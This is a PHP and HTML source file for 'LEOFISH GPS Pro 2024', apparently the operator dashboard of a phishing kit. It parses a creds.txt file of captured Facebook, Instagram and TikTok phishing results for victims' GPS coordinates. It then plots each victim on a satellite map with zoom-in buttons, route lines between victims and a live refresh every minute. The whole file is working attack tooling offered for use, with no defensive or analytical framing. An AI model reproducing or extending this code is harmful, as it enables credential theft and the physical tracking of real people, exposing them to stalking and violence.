<?php
date_default_timezone_set('Africa/Bujumbura');

// Parser GPS de creds.txt (même code backend)
$victims = [];
if (file_exists('creds.txt')) {
    $lines = file('creds.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (preg_match('/📍 GPS POSITION\s*:\s*([-\d.]+),([-\d.]+)/', $line, $matches)) {
            preg_match('/(FACEBOOK|INSTAGRAM|TIKTOK)/', $line, $platform);
            $victims[] = [
                'platform' => $platform[1] ?? 'UNKNOWN',
                'lat' => floatval($matches[1]),
                'lng' => floatval($matches[2]),
                'time' => date('H:i:s')
            ];
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>LEOFISH GPS Pro 2024</title>
    <meta charset="utf-8">
    <!-- Leaflet + Tuiles SATELLITE GOOGLE 2024 -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.7.1/dist/MarkerCluster.css"/>
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.7.1/dist/MarkerCluster.Default.css"/>
    <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0c0c0c,#1a1a2e);color:#fff;overflow:hidden;}
    .header{position:fixed;top:0;left:0;right:0;background:rgba(0,0,0,0.9);backdrop-filter:blur(20px);padding:15px;z-index:1000;border-bottom:2px solid #00ff88;}
    .title{font-size:24px;font-weight:700;text-align:center;background:linear-gradient(45deg,#00ff88,#00ccff);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
    .stats{display:flex;justify-content:space-around;font-size:16px;margin-top:10px;}
    .stat{padding:8px 15px;background:rgba(0,255,136,0.1);border-radius:20px;border:1px solid rgba(0,255,136,0.3);min-width:80px;text-align:center;}
    #map{height:100vh;width:100%;cursor:grab;}
    #map:active{cursor:grabbing;}
    .legend{position:fixed;bottom:20px;left:20px;background:rgba(0,0,0,0.9);padding:20px;border-radius:15px;border:2px solid #00ff88;max-width:200px;}
    .legend-item{display:flex;align-items:center;margin:8px 0;font-size:14px;}
    .legend-color{width:20px;height:20px;border-radius:50%;margin-right:10px;border:2px solid #fff;}
    .controls{position:fixed;top:80px;right:20px;display:flex;flex-direction:column;gap:10px;}
    .btn{background:rgba(0,255,136,0.2);color:#00ff88;border:2px solid #00ff88;padding:12px 20px;border-radius:25px;cursor:pointer;font-weight:600;transition:all 0.3s;font-family:inherit;}
    .btn:hover{background:#00ff88;color:#000;transform:scale(1.05);}
    </style>
</head>
<body>
    <div class="header">
        <div class="title">🛰️ LEOFISH GPS TRACKING SATELLITE 2024</div>
        <div class="stats">
            <div class="stat">📍 <span id="victim-count"><?php echo count($victims); ?></span></div>
            <div class="stat">🕒 <span id="time"><?php echo date('H:i:s'); ?></span></div>
            <div class="stat">🔍 Zoom 19</div>
        </div>
    </div>
    
    <div class="controls">
        <button class="btn" onclick="fitAllMarkers()">🎯 Zoom Auto</button>
        <button class="btn" onclick="toggleRoutes()">🛤️ Routes</button>
        <button class="btn" onclick="location.reload()">🔄 Live</button>
    </div>
    
    <div class="legend">
        <div class="legend-item"><div class="legend-color" style="background:#1877f2;"></div>Facebook</div>
        <div class="legend-item"><div class="legend-color" style="background:#E4405F;"></div>Instagram</div>
        <div class="legend-item"><div class="legend-color" style="background:#FF0050;"></div>TikTok</div>
    </div>

    <div id="map"></div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.7.1/dist/leaflet.markercluster.js"></script>
    <script>
    // Map pro 2024 - Tuiles SATELLITE HD (Esri WorldImagery 2024)
    const map = L.map('map', {
        zoomControl: true,
        minZoom: 3,
        maxZoom: 22,
        zoomDelta: 0.5,
        wheelPxPerZoomLevel: 120
    }).setView([-3.38, 29.36], 13);

    // SATELLITE 2024 - Esri World Imagery (meilleur que ArcGIS)
    L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
        attribution: 'LEOFSIH GPS Pro 2024 &copy; Esri',
        maxZoom: 22,
        maxNativeZoom: 19
    }).addTo(map);

    // Overlay routes + noms (OpenStreetMap)
    const routeLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        opacity: 0.7,
        maxZoom: 19,
        attribution: 'Routes © OpenStreetMap'
    });

    const markers = L.markerClusterGroup({
        spiderfyOnMaxZoom: true,
        showCoverageOnHover: true,
        zoomToBoundsOnClick: true,
        maxClusterRadius: 50
    });

    let routes = L.layerGroup().addTo(map);
    let showRoutes = false;

    // Markers + routes depuis PHP
    <?php foreach ($victims as $i => $victim): ?>
    const marker<?php echo $i; ?> = L.marker([<?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?>], {
        icon: L.divIcon({
            className: 'victim-marker',
            html: `<div style="background:${
                <?php echo $victim['platform'] == 'FACEBOOK' ? "'#1877f2'" : 
                      ($victim['platform'] == 'INSTAGRAM' ? "'#E4405F'" : "'#FF0050'"); 
                ?>};width:24px;height:24px;border-radius:50%;border:3px solid #fff;box-shadow:0 0 15px rgba(255,255,255,0.8);position:relative;">
                <div style="position:absolute;top:-8px;left:-8px;width:100%;height:100%;background:rgba(0,255,136,0.6);border-radius:50%;animation:pulse 2s infinite;"></div>
            </div>`,
            iconSize: [24, 24],
            iconAnchor: [12, 12]
        })
    }).bindPopup(`
        <div style="font-family:monospace;">
            <b style="color:${<?php echo $victim['platform'] == 'FACEBOOK' ? "'#1877f2'" : 
                                ($victim['platform'] == 'INSTAGRAM' ? "'#E4405F'" : "'#FF0050'"); ?>}"><?php echo $victim['platform']; ?></b><br>
            📍 <b><?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?></b><br>
            🕒 <?php echo $victim['time']; ?><br>
            <button onclick="map.setView([<?php echo $victim['lat']; ?>, <?php echo $victim['lng']; ?>], 18)" style="margin-top:5px;padding:5px;background:#00ff88;color:#000;border:none;border-radius:3px;cursor:pointer;">🔍 Zoom ici</button>
        </div>
    `);
    markers.addLayer(marker<?php echo $i; ?>);
    <?php endforeach; ?>

    map.addLayer(markers);

    // Routes interactives entre markers
    function updateRoutes() {
        routes.clearLayers();
        if (showRoutes && window.victims && window.victims.length > 1) {
            for (let i = 0; i < window.victims.length - 1; i++) {
                const latlngs = [
                    [window.victims[i].lat, window.victims[i].lng],
                    [window.victims[i+1].lat, window.victims[i+1].lng]
                ];
                L.polyline(latlngs, {
                    color: '#00ff88',
                    weight: 4,
                    opacity: 0.8,
                    dashArray: '10, 10'
                }).addTo(routes).bindPopup(`Route Victim ${i+1} → ${i+2}`);
            }
        }
    }

    // Controls
    window.victims = <?php echo json_encode($victims); ?>;
    updateRoutes();

    function fitAllMarkers() {
        if (window.victims.length > 0) {
            const group = new L.featureGroup(markers.getLayers());
            map.fitBounds(group.getBounds().pad(0.1));
        }
    }

    function toggleRoutes() {
        showRoutes = !showRoutes;
        if (showRoutes) {
            routeLayer.addTo(map);
            routes.addTo(map);
            updateRoutes();
        } else {
            map.removeLayer(routeLayer);
            map.removeLayer(routes);
        }
    }

    // Animations CSS
    const style = document.createElement('style');
    style.textContent = `
        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(2); opacity: 0; }
        }
    `;
    document.head.appendChild(style);

    // Auto refresh  1min
    setInterval(() => location.reload(), 60000);
    </script>
</body>
</html>
